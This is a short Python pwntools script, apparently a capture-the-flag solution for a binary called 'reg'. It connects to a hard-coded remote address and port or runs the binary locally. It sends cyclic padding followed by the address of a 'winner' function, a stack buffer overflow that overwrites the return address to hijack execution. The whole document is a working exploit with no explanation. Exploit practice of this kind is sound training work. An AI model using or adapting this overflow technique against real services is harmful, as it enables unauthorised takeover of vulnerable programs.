#!/usr/bin/env python3


from pwn import *

BINARY = "./reg"
ADDR = "138.68.182.20"
PORT = 31561

splash()
elf = context.binary = ELF(BINARY)


def conn():
    if args.LOCAL:
        pty = process.PTY
        return process(elf.path, stdin=pty, stdout=pty, stderr=pty)

    else:
        return remote(ADDR, PORT)


def solve() -> None:
    io = conn()

    payload = [
        cyclic(cyclic_find(0x6161616161616168, n=8), n=8),
        elf.sym.winner,
    ]
    io.sendlineafter("Enter your name : ", flat(payload))

    print(io.recvall())


if __name__ == "__main__":
    solve()
